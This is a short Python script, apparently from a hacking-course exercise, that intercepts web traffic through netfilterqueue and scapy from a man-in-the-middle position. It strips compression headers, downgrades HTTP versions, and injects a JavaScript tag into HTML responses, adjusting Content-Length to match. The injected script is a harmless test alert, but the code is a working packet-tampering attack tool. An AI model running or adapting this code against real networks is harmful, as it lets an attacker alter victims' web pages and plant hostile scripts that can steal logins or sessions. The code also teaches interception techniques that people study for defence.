#!/usr/bin/env python

import scapy.all as scapy
import netfilterqueue
import re


def setload(packet, load):
    packet[scapy.Raw].load = load
    del packet[scapy.IP].len
    del packet[scapy.IP].chksum
    del packet[scapy.TCP].chksum
    return packet


def netfilter(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[scapy.Raw].load
        if scapy_packet[scapy.TCP].dport == 10000:
            print("HTTP Request")
            load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
            load = load.replace("HTTP/1.1", "HTTP/1.0")
            # print(scapy_packet.show())
        elif scapy_packet[scapy.TCP].sport == 10000:
            print("HTTP Response")
            #print(scapy_packet.show())
            code_injection = "<script>alert('test');</script>"
            load = load.replace("</body>", code_injection + "</body>")
            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
            if content_length_search and "text/html" in load:
                content_length = content_length_search.group(1)
                new_content_length = int(content_length) + len(code_injection)
                load = load.replace(content_length, str(new_content_length))
        if load != scapy_packet[scapy.Raw].load:
            new_packet = setload(scapy_packet, load)
            packet.set_payload(str(new_packet))
    packet.accept()

queue = netfilterqueue.NetfilterQueue()
queue.bind(0, netfilter)
queue.run()
